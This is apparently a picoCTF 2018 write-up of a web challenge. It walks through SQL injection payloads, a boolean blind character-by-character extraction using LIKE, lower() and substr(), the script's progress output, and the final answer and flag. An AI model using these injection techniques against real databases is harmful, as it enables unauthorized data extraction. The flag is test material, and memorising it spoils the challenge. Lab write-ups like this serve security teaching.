# A Simple Question
Web Exploitation - 650 points

## Challenge 
> There is a website running at http://2018shell2.picoctf.com:28120 (link). Try to see if you can answer its question.


## Solution

Website shows a query box annd upon submission, it will show us the SQL query

	SQL query: SELECT * FROM answers WHERE answer='testing'
	Wrong.

So we can try SQL injection using `' or 1=1;--`:

	SQL query: SELECT * FROM answers WHERE answer='' or 1=1;--'
	You are so close.

Using `' or answer like '%`:
	
	SQL query: SELECT * FROM answers WHERE answer='' or answer like '%'
	You are so close.

Seems like it will either show `Wrong.` for false and `You are so close.` for true.

We can try bruteforcing char by char


After a while, I got the following but it wasn't the answer

	Progress: 41andsixsixths [14]

---

According to some people on the forums, LIKE could be case-insensitive depending on the database.

Checking for `' or answer = '41andsixsixths` give me `Wrong.`

But checking for `' or lower(answer) = '41andsixsixths` gives me `You are so close.`

---

[Looking at the possible functions for SQLite](https://www.sqlite.org/lang_corefunc.html
), I came up with this to check each index if it is uppercase

	' or substr(answer, 3, 1) <> lower(substr(answer, 3, 1)) ;--

Automate it in our script to get the capitals
	
	Case insensitive answer:  41andsixsixths
	Progress: ['4', '1', 'a', 'n', 'd', 's', 'i', 'x', 's', 'i', 'x', 't', 'h', 's'] [Checking 0]
	Progress: ['4', '1', 'a', 'n', 'd', 's', 'i', 'x', 's', 'i', 'x', 't', 'h', 's'] [Checking 1]
	Progress: ['4', '1', 'a', 'n', 'd', 's', 'i', 'x', 's', 'i', 'x', 't', 'h', 's'] [Checking 2]
	Progress: ['4', '1', 'A', 'n', 'd', 's', 'i', 'x', 's', 'i', 'x', 't', 'h', 's'] [Checking 3]
	Progress: ['4', '1', 'A', 'n', 'd', 's', 'i', 'x', 's', 'i', 'x', 't', 'h', 's'] [Checking 4]
	Progress: ['4', '1', 'A', 'n', 'd', 's', 'i', 'x', 's', 'i', 'x', 't', 'h', 's'] [Checking 5]
	Progress: ['4', '1', 'A', 'n', 'd', 'S', 'i', 'x', 's', 'i', 'x', 't', 'h', 's'] [Checking 6]
	Progress: ['4', '1', 'A', 'n', 'd', 'S', 'i', 'x', 's', 'i', 'x', 't', 'h', 's'] [Checking 7]
	Progress: ['4', '1', 'A', 'n', 'd', 'S', 'i', 'x', 's', 'i', 'x', 't', 'h', 's'] [Checking 8]
	Progress: ['4', '1', 'A', 'n', 'd', 'S', 'i', 'x', 'S', 'i', 'x', 't', 'h', 's'] [Checking 9]
	Progress: ['4', '1', 'A', 'n', 'd', 'S', 'i', 'x', 'S', 'i', 'x', 't', 'h', 's'] [Checking 10]
	Progress: ['4', '1', 'A', 'n', 'd', 'S', 'i', 'x', 'S', 'i', 'x', 't', 'h', 's'] [Checking 11]
	Progress: ['4', '1', 'A', 'n', 'd', 'S', 'i', 'x', 'S', 'i', 'x', 't', 'h', 's'] [Checking 12]
	Progress: ['4', '1', 'A', 'n', 'd', 'S', 'i', 'x', 'S', 'i', 'x', 't', 'h', 's'] [Checking 13]
	Success: 41AndSixSixths

## Flag

	SQL query: SELECT * FROM answers WHERE answer='41AndSixSixths'
	Perfect!
	Your flag is: picoCTF{qu3stions_ar3_h4rd_73139cd9}
